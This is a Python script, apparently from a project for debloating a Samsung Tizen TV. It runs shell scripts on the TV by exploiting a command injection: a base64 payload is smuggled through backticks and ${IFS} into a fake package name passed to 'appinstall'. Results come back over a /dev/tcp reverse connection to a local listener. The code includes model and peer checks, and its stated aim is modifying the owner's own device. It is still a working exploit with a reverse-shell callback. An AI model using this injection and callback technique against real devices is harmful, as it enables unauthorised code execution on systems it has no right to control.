"""Stages and runs a plain shell script on the TV via the same reviewed package-name
command-execution workaround as scripts/native-home/run.py (see that file and
scripts/native-home/README.md for the full explanation of the transport). Reused here
because app enable/disable is a plain CLI/file operation (pkgcmd, sqlite3 against
pkgmgr_parser.db) - unlike native Home routing, it needs no compiled helper or native
library P/Invoke, so this version skips the .NET staging entirely.

Usage: python3 scripts/debloat/run.py <script-name-without-.sh>
e.g.:  python3 scripts/debloat/run.py inspect
"""
from pathlib import Path
import sys, base64, ipaddress, json, socket, subprocess, time, uuid, urllib.request

r = Path(__file__).resolve().parents[2]
d = r / '.local/debloat'
d.mkdir(parents=True, exist_ok=True)
if len(sys.argv) != 2:
    raise SystemExit('Usage: run.py <script-name-without-.sh>')
name = sys.argv[1]
script_path = Path(__file__).resolve().parent / (name + '.sh')
if not script_path.is_file():
    raise SystemExit('No such script: ' + str(script_path))

host = json.loads((r / '.local/device.json').read_text())['host']
ipaddress.ip_address(host)
with urllib.request.urlopen('http://' + host + ':8001/api/v2/', timeout=4) as response:
    info = json.load(response)
if info.get('device', {}).get('modelName') != 'UE55CU7100KXXU':
    raise SystemExit('Model guard failed; nothing staged.')

sdb = str(r / '.local/tizen-sdk/tools/sdb')
serial = host + ':26101'


def run(args, timeout=12):
    p = subprocess.run([sdb, *args], capture_output=True, text=True, timeout=timeout)
    if p.returncode:
        raise RuntimeError('SDB transport failed: ' + p.stdout[-300:] + p.stderr[-300:])
    return p


run(['connect', serial])
token = uuid.uuid4().hex[:12]
remote = '/home/owner/share/tmp/sdk_tools/cfdb-' + token + '.sh'
run(['-s', serial, 'push', str(script_path), remote])

with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as route:
    route.connect((host, 9))
    local = route.getsockname()[0]
with socket.socket() as listener:
    listener.bind((local, 0))
    listener.listen(1)
    listener.settimeout(18)
    port = listener.getsockname()[1]
    command = 'exec 3<>/dev/tcp/' + local + '/' + str(port) + ';cat ' + remote + '|bash >&3 2>&3;exec 3>&-'
    script = '/bin/mkdir /tmp/s-' + token + ' 2>/dev/null&&{ ' + command + ';}'
    encoded = base64.b64encode(script.encode()).decode()
    pkg_name = 'new2.tpk`printf${IFS}%s${IFS}' + encoded + '|base64${IFS}-d|bash`.tpk'
    argument = '0 appinstall tpk ' + pkg_name
    if len(argument.encode()) > 400:
        raise SystemExit('Command exceeds reviewed transport length; not executed.')
    proc = subprocess.Popen([sdb, '-s', serial, 'shell', argument], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    try:
        connection, peer = listener.accept()
        if peer[0] != host:
            raise RuntimeError('Unexpected callback peer; no data accepted.')
        chunks = []
        with connection:
            connection.settimeout(8)
            while True:
                chunk = connection.recv(65536)
                if not chunk:
                    break
                chunks.append(chunk)
                if sum(map(len, chunks)) > 100000:
                    raise RuntimeError('Unexpectedly large diagnostic output.')
        output = b''.join(chunks).decode(errors='replace')
        try:
            stdout, stderr = proc.communicate(timeout=8)
        except subprocess.TimeoutExpired:
            proc.terminate()
            stdout, stderr = proc.communicate(timeout=3)
        (d / (name + '-output.txt')).write_text(output)
        (d / (name + '-transport.json')).write_text(json.dumps({'returncode': proc.returncode, 'stdout': stdout, 'stderr': stderr, 'remote_probe': remote, 'time': time.time()}, indent=2))
        if 'CLEANFRAME_DEBLOAT_BEGIN' not in output or 'CLEANFRAME_DEBLOAT_END' not in output:
            raise RuntimeError('Probe incomplete; device state is unknown. Inspect current values before retrying.')
        print(output)
    finally:
        if proc.poll() is None:
            proc.terminate()
            proc.communicate(timeout=3)
